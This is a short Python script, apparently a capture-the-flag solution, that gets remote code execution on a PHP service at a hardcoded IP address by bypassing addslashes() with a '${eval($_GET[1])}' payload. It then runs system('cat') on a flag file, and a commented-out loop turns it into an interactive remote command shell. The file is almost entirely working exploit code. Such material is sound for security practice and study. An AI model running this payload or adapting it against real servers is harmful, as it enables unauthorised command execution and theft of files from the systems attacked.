import requests, html

# RCE using php addslashes() bypass
# excerpt from https://www.programmersought.com/article/30723400042/

url = "http://206.189.125.37:32562/?format="
payload = """${eval($_GET[1])}&1=system('cat ../flagaBWBE');"""
r = requests.get(url+payload)
print(html.unescape(r.text))
# while True:
    # payload = input()
    # if "quit" or "exit" not in payload:
        # r = requests.get(url+payload)
        # print(html.unescape(r.text.split("\n")[24]))
    # else: break

# +#$%^&*()` is escaped to empty space